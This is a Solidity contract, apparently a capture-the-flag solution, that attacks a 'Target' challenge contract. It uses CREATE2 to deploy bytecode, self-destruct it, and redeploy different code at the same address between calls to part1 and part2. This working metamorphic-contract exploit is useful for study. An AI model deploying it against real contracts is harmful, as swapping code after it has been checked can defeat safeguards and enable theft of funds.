/**
 *Submitted for verification at Etherscan.io on 2021-03-29
*/

contract Target{
    function part1(address addr) external{}
    function part2() external{}
    function die() external{}
}
contract solution{
    event deployed(address indexed addr);
    bytes  _deployBytecode;
            bytes  bc = hex"6080604052348015600f57600080fd5b50608c8061001e6000396000f3fe6080604052348015600f57600080fd5b506004361060325760003560e01c806335f46994146037578063a22f832514603f575b600080fd5b603d6053565b005b602a60405190815260200160405180910390f35b33fffea264697066735822122038169d30ce070b29219dd8a8d5b362dc692a8848b16e176d8f707aa291831c5a64736f6c63430008030033";
        bytes  bcc = hex"6080604052348015600f57600080fd5b50607880601d6000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c8063a22f832514602d575b600080fd5b61a45560405190815260200160405180910390f3fea26469706673582212207c8b2b42d3fa0c41d96b3ae9be3262c644814be79f7594f0da61a84d9b4040dc64736f6c63430008030033";
    function win(address target, uint salt) public{
        bytes memory  const = hex"6080604052348015600f57600080fd5b506000339050606081600160a060020a03166331d191666040518163ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040160006040518083038186803b158015606b57600080fd5b505afa158015607e573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f19168201604052602081101560a657600080fd5b81019080805164010000000081111560bd57600080fd5b8201602081018481111560cf57600080fd5b815164010000000081118282018710171560e857600080fd5b5050805190945092508291505060208301f3fe";

        address addr;
        _deployBytecode = bc;
        assembly {addr := create2(0, add(const, 0x20), mload(const), salt)}
                emit deployed(addr);

        Target(target).part1(addr);
        Target(addr).die();
        _deployBytecode = bcc;
        assembly {addr := create2(0, add(const, 0x20), mload(const), salt)}
         Target(target).part2();
    }

    function deployBytecode() public view returns(bytes memory){
        return _deployBytecode;
    }
}